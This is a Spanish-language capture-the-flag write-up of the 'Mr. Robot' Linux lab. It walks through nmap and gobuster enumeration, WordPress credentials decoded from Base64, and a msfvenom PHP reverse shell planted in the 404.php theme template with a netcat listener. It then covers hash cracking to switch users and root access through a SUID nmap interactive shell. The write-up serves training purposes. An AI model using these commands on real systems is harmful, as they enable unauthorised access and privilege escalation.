# Mr. Robot CTF

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux basada en **WordPress**, obtener acceso inicial mediante la subida de una **reverse shell**, pivotar entre usuarios del sistema y escalar privilegios explotando un binario **SUID** hasta obtener las tres flags del laboratorio.

---

## 🛠️ Tecnologías trabajadas

- WordPress
- Gobuster
- Base64
- msfvenom
- Reverse Shell
- Netcat
- SUID
- GTFOBins
- Nmap

---

## 🧠 Metodología

La enumeración inicial mostró únicamente los puertos **80** y **443**, por lo que toda la investigación se centró en la aplicación web. Durante la exploración apareció rápidamente una instalación de **WordPress**, por lo que la estrategia pasó a ser obtener acceso al panel de administración antes que buscar vulnerabilidades directamente sobre el servidor.

La enumeración de directorios resultó especialmente importante, ya que permitió localizar varias rutas ocultas con información útil. En lugar de intentar realizar ataques de fuerza bruta sobre el panel de autenticación, decidí aprovechar toda la información disponible en los archivos expuestos, lo que permitió obtener directamente las credenciales de acceso.

Una vez dentro del panel de WordPress, utilicé una funcionalidad legítima del CMS para modificar una plantilla e introducir una **reverse shell**. Tras conseguir acceso al sistema, la enumeración interna permitió identificar otro usuario con mayores privilegios y localizar un hash que podía convertirse fácilmente en una contraseña válida.

Finalmente, la búsqueda de binarios **SUID** reveló una versión vulnerable de **Nmap** que todavía conservaba el modo interactivo, permitiendo obtener una shell privilegiada como **root**.

Este laboratorio demuestra cómo pequeñas exposiciones de información pueden terminar comprometiendo completamente un sistema cuando se encadenan correctamente.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé comprobando la conectividad con la máquina objetivo mediante `ping` y confirmé que se trataba de un sistema Linux gracias al TTL obtenido.

Posteriormente realicé un escaneo completo utilizando Nmap.

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.10.252.92
```

Se identificaron los siguientes servicios:

| Puerto | Servicio |
|---------|----------|
| 80 | HTTP |
| 443 | HTTPS |

---

### 2. Enumeración web

Al acceder al sitio web observé una página que simulaba una terminal Linux. Aunque el código fuente no contenía información relevante, la apariencia del sitio dejaba entrever que el laboratorio estaba inspirado en la serie **Mr. Robot**.

Realicé una enumeración de directorios utilizando Gobuster.

```bash
gobuster dir -u http://10.10.252.92 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Durante la enumeración aparecieron varios recursos importantes:

- `/robots`
- `/license`
- `/wp-login.php`

Dentro de `robots.txt` encontré:

- La primera flag (`key-1-of-3.txt`)
- Un diccionario que posteriormente resultó útil.

En el directorio `/license` aparecía un texto codificado en **Base64**.

Tras descodificarlo obtuve las credenciales del panel de WordPress.

```
Usuario: elliot

Contraseña: ER28-0652
```

---

### 3. Acceso inicial

Con las credenciales obtenidas inicié sesión en el panel de administración de WordPress.

Aproveché el editor de temas para modificar la plantilla **404.php**, sustituyéndola por una **reverse shell** generada mediante **msfvenom**.

```bash
msfvenom -p php/reverse_php LHOST=10.23.88.247 LPORT=443 --f raw > pwned.php
```

Preparé un listener en mi máquina atacante.

```bash
nc -lvnp 443
```

Posteriormente forcé la ejecución de la plantilla accediendo a una URL inexistente.

La reverse shell se ejecutó correctamente y obtuve acceso al servidor.

---

### 4. Estabilización de la shell

Para disponer de una sesión mucho más estable abrí una nueva reverse shell hacia otro puerto.

Posteriormente realicé el tratamiento habitual de la TTY utilizando Python.

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

A partir de ese momento ya disponía de una shell completamente interactiva.

El usuario comprometido era:

```
daemon
```

---

### 5. Enumeración interna

Comencé revisando los usuarios del sistema.

```bash
cat /etc/passwd
```

Los usuarios más interesantes eran:

- robot
- root

Dentro del directorio personal de **robot** encontré dos archivos importantes:

- `key-2-of-3.txt`
- `password.raw-md5`

Aunque no tenía permisos para leer la segunda flag, sí pude acceder al hash almacenado en `password.raw-md5`.

Tras crackearlo obtuve la contraseña:

```
abcdefghijklmnopqrstuvwxyz
```

Con ella cambié al usuario **robot**.

```bash
su robot
```

Ahora sí fue posible recuperar la segunda flag.

---

### 6. Escalada de privilegios

Comencé utilizando las técnicas habituales.

```bash
sudo -l
```

No existían permisos interesantes.

A continuación busqué binarios SUID.

```bash
find / -perm -4000 2>/dev/null
```

Entre ellos apareció:

```
/usr/local/bin/nmap
```

Consultando GTFOBins descubrí que la versión instalada conservaba el antiguo modo interactivo.

Bastó ejecutar:

```bash
nmap --interactive
```

Y posteriormente:

```text
!sh
```

Con ello obtuve una shell como **root**.

Finalmente accedí al directorio:

```
/root
```

y recuperé la tercera y última flag.

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación muy completa, combinando técnicas de pentesting web, post-explotación y escalada de privilegios.
- Enumerar instalaciones WordPress mediante Gobuster.
- Analizar archivos públicos como `robots.txt` y `license`.
- Descodificar información en Base64 para recuperar credenciales.
- Aprovechar el editor de temas de WordPress para subir una reverse shell.
- Generar payloads PHP mediante **msfvenom**.
- Estabilizar una shell utilizando Python.
- Identificar usuarios interesantes revisando `/etc/passwd`.
- Aprovechar hashes almacenados en archivos del sistema para comprometer otros usuarios.
- Escalar privilegios explotando versiones antiguas de **Nmap** con permisos SUID.

> **⚠️ Nota importante**
>
> Cuando se generan payloads o reverse shells con **msfvenom**, es fundamental comprobar siempre que la dirección **LHOST** corresponde a la IP actual de la máquina atacante. Un cambio de red o de VPN puede provocar que el payload apunte a una dirección incorrecta y la conexión nunca llegue a establecerse.
